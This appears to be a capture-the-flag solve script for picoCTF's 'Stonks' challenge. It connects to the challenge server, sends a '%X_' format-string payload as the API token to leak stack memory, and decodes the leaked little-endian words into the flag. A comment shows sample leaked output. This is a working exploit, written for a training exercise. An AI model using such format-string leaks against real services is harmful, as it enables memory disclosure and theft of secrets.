#!/usr/bin/env python3

SERVER = 'mercury.picoctf.net'
PORT = 27912

import asyncio


def stack_to_string(stack):
    for x in stack.split(b'_'):
        padding = (8 - len(x)) * b'0'
        x = padding + x
        # '8FFE430' --> '08FFE430'
        #       --> '08 FF  E4  30'
        #           4th 3rd 2nd 1st char
        for i in range(0, 8, 2):
            # last to first (endianness)
            char = x[6-i:8-i]
            print(chr(int(char, 16)), end='')
    print()
    return stack


async def tcp_sonks():
    reader, writer = await asyncio.open_connection(SERVER, PORT)

    await reader.readuntil(b'View my portfolio\n')

    writer.write(b'1\n')
    await writer.drain()

    await reader.readuntil(b'What is your API token?\n')

    stack_printer = '%X_' * 100 + '\n'
    writer.write(stack_printer.encode())
    await writer.drain()

    await reader.readuntil(b'Buying stonks with token:\n')

    stack = await reader.readline()
    # extracted_X = b'8FFE430_804B000_80489C3_F7FA0D80_FFFFFFFF_1_8FFC160_F7FAE110_F7FA0DC7_0_8FFD180_2_8FFE410_8FFE430_6F636970_7B465443_306C5F49_345F7435_6D5F6C6C_306D5F79_5F79336E_32666331_30613130_FFFC007D_F7FDBAF8_F7FAE440_D835D800_1_0_F7E3DCE9_F7FAF0C0_F7FA05C0_F7FA0000_FFFC66C8_F7E2E68D_F7FA05C0_8048ECA_FFFC66D4_0_F7FC2F09_804B000_F7FA0000_F7FA0E20_FFFC6708_F7FC8D50_F7FA1890_D835D800_F7FA0000_804B000_FFFC6708_8048C86_8FFC160_FFFC66F4_FFFC6708_8048BE9_F7FA03FC_0_FFFC67BC_FFFC67B4_1_1_8FFC160_D835D800_FFFC6720_0_0_F7DE3FA1_F7FA0000_F7FA0000_0_F7DE3FA1_1_FFFC67B4_FFFC67BC_FFFC6744_1_0_F7FA0000_F7FC370A_F7FDB000_0_F7FA0000_0_0_2BF304A1_6F4382B1_0_0_0_1_8048630_0_F7FC8D50_F7FC3960_804B000_1_8048630_0_8048662_8048B85\n'

    stack_to_string(stack[:-1])

    writer.close()

asyncio.run(tcp_sonks())


